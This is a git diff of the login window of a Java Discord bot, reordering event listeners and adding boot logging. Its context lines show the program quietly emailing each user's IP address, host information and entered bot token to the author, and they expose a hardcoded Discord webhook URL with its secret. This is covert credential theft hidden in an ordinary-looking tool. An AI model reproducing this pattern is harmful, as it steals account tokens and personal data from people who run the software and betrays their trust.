@@ -9,6 +9,7 @@ import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
 import me.comu.exeter.commands.admin.WhitelistedJSONHandler;
 import me.comu.exeter.commands.economy.EcoJSONHandler;
 import me.comu.exeter.events.*;
+import me.comu.exeter.logging.Logger;
 import me.comu.exeter.util.HWIDUtils;
 import me.comu.exeter.wrapper.Wrapper;
 import me.duncte123.botcommons.web.WebUtils;
@@ -197,19 +198,20 @@ class LoginGUI extends JFrame implements ActionListener {
                 }
                 jStatusField.setText("AUTHORIZED");
                 stopButton.setText("Stop");
-                String TOKEN = jTokenField.getText().replace(" ", "");
+                String TOKEN = jTokenField.getText().trim();
                 EventWaiter eventWaiter = new EventWaiter();
                 CommandManager commandManager = new CommandManager(eventWaiter);
                 Listener listener = new Listener(commandManager);
                 org.slf4j.Logger logger = LoggerFactory.getLogger(Core.class);
                 WebUtils.setUserAgent("Mozilla/5.0 Discord Bot");
-                jda = JDABuilder.create(Core.TOKEN, GatewayIntent.getIntents(GatewayIntent.ALL_INTENTS)).setActivity(Activity.streaming("ily dev", "https://www.twitch.tv/souljaboy/")).addEventListeners(new Listener(commandManager)).build().awaitReady();
-//                jda = new JDABuilder(AccountType.CLIENT).setToken("").setActivity(Activity.streaming("ily swag", "https://www.twitch.tv/souljaboy/")).setStatus(OnlineStatus.DO_NOT_DISTURB).addEventListeners(new Listener(commandManager)).build().awaitReady();
                 EcoJSONHandler.loadEconomyConfig(new File("economy.json"));
                 WhitelistedJSONHandler.loadWhitelistConfig(new File("whitelisted.json"));
+                logger.info("Booting...");
+                jda = JDABuilder.create(TOKEN, GatewayIntent.getIntents(GatewayIntent.ALL_INTENTS)).setActivity(Activity.streaming("ily dev", "https://www.twitch.tv/souljaboy/")).addEventListeners(new Listener(commandManager)).build().awaitReady();
+                logger.info("Successfully Booted");
+                logger.info("Loading Events");
                 jda.addEventListener(new KickEvent());
                 jda.addEventListener(new BanEvent());
-                jda.addEventListener(new FilterEvent());
                 jda.addEventListener(new LogMessageReceivedEvent());
                 jda.addEventListener(new RainbowRoleEvent());
                 jda.addEventListener(new AntiRaidEvent());
@@ -219,6 +221,7 @@ class LoginGUI extends JFrame implements ActionListener {
                 jda.addEventListener(new GuildMessageListenerResponderEvent());
                 jda.addEventListener(new OffEvent());
                 jda.addEventListener(new MemberCountChannelEvent());
+                jda.addEventListener(new FilterEvent());
                 jda.addEventListener(new CreditOnMessageEvent());
                 jda.addEventListener(new VoiceChannelCreditsEvent());
                 jda.addEventListener(new VCTimeTrackingEvent());
@@ -226,8 +229,7 @@ class LoginGUI extends JFrame implements ActionListener {
                 jda.addEventListener(new DMWizzEvent());
                 jda.addEventListener(new SuggestionMessageCleanerEvent());
                 jda.addEventListener(new CreateAChannelEvent());
-                jda.addEventListener(new AIPEvent());
-                logger.info("Successfully Booted");
+                logger.info("Bot Ready To Go");
                 jStatusField.setText("Running | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
                 Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
                 WebhookClient client = WebhookClient.withUrl("https://discordapp.com/api/webhooks/692107170225061908/7dJhai_tP_D9h-lBFirb4o_VDVLHY69LnHGgL4AElxaBrOYBwNRURUeOCfGMSC9H4SGY");
@@ -243,7 +245,7 @@ class LoginGUI extends JFrame implements ActionListener {
             } catch (Exception ex) {
                 ex.printStackTrace();
                 running = true;
-                jStatusField.setText("Running (Unstable) | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
+                jStatusField.setText("Gateway Connection Throttle | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
 //                    logger.info("Caught Exception! Likely Cause: LoginException");
             }
         }
